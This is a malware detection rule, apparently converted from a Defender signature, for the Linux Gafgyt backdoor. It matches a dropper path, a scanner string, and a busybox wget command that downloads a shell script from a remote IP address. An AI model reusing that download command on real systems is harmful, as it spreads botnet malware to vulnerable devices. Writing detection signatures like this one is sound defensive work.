
rule Backdoor_Linux_Gafgyt_AK_MTB{
	meta:
		description = "Backdoor:Linux/Gafgyt.AK!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_00_0 = {2f 2e 63 6f 77 62 6f 74 2e 64 72 6f 70 70 65 72 } //2 /.cowbot.dropper
		$a_00_1 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a 2f 2f 25 64 2e 25 64 2e 25 64 2e 25 64 2f 75 6e 6b 2e 73 68 20 2d 4f 2d 20 3e 2e 72 62 6f 74 2e 73 68 65 6c 6c } //1 /bin/busybox wget http://%d.%d.%d.%d/unk.sh -O- >.rbot.shell
		$a_00_2 = {63 6f 77 66 66 78 78 6e 61 20 73 63 61 6e 6e 65 72 2e 25 73 } //1 cowffxxna scanner.%s
	condition:
		((#a_00_0  & 1)*2+(#a_00_1  & 1)*1+(#a_00_2  & 1)*1) >=3
 
}